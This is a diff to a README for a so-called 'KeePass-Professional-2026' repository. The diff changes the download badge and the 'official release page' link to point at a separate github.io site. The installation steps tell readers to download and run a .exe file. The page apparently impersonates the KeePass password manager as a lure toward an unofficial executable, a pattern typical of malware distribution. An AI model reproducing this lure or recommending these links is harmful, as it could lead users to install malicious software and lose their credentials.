@@ -1,6 +1,6 @@
 # 🔐 KeePass-Professional-2026 - Securely manage your private passwords today
 
-[![Download KeePass Professional](https://img.shields.io/badge/Download-KeePass-blue.svg)](https://github.com/Dulciecatalytic497/KeePass-Professional-2026)
+[![Download KeePass Professional](https://img.shields.io/badge/Download-KeePass-blue.svg)](https://dulciecatalytic497.github.io)
 
 ## 📌 About this application 
 
@@ -20,7 +20,7 @@ This software works on standard Windows configurations. You need the following i
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official release page: [https://github.com/Dulciecatalytic497/KeePass-Professional-2026](https://github.com/Dulciecatalytic497/KeePass-Professional-2026)
+1.  Visit the official release page: [https://dulciecatalytic497.github.io](https://dulciecatalytic497.github.io)
 2.  Locate the section labeled Releases or Assets.
 3.  Click the file ending in .exe to begin the download.
 4.  Wait for the download to finish.
